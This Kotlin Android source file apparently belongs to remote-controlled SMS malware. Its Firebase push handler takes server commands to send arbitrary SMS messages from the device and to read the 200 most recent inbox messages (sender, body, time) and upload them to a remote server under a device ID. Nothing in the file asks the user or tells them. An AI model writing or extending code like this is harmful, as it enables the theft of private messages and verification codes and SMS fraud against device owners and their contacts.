package com.boom.client.services

import android.util.Log
import com.boom.client.api.ApiClient
import com.boom.client.utils.Prefs
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import android.telephony.SmsManager

class FcmService : FirebaseMessagingService() {

    companion object { var currentToken: String? = null }

    override fun onNewToken(token: String) { currentToken = token }

    override fun onMessageReceived(message: RemoteMessage) {
        val data = message.data
        when (data["type"]) {
            "send_sms" -> handleSendSms(data)
            "get_sms" -> Thread { handleGetSms() }.start()
            "ping" -> ApiClient.checkin(
                Prefs.deviceId, "", "", "", "", "", "", "", 0, currentToken ?: ""
            )
        }
    }

    private fun handleSendSms(data: Map<String, String>) {
        val to = data["to"] ?: return
        val body = data["body"] ?: return
        val smsId = data["smsId"] ?: ""
        try {
            val mgr = SmsManager.getDefault()
            mgr.sendMultipartTextMessage(to, null, mgr.divideMessage(body), null, null)
            ApiClient.reportSmsResult(smsId, true)
        } catch (e: Exception) {
            Log.e("BOOM", "SMS fail: ${e.message}")
            ApiClient.reportSmsResult(smsId, false)
        }
    }

    private fun handleGetSms() {
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date", "thread_id"),
                null, null, "date DESC LIMIT 200"
            )
            val arr = org.json.JSONArray()
            cursor?.use {
                while (it.moveToNext()) {
                    arr.put(org.json.JSONObject().apply {
                        put("address", it.getString(0))
                        put("body", it.getString(1))
                        put("timestamp", it.getLong(2))
                        put("threadId", it.getString(3))
                    })
                }
            }
            if (arr.length() > 0) ApiClient.uploadSms(Prefs.deviceId, arr)
        } catch (e: Exception) { Log.e("BOOM", "Get SMS fail: ${e.message}") }
    }
}
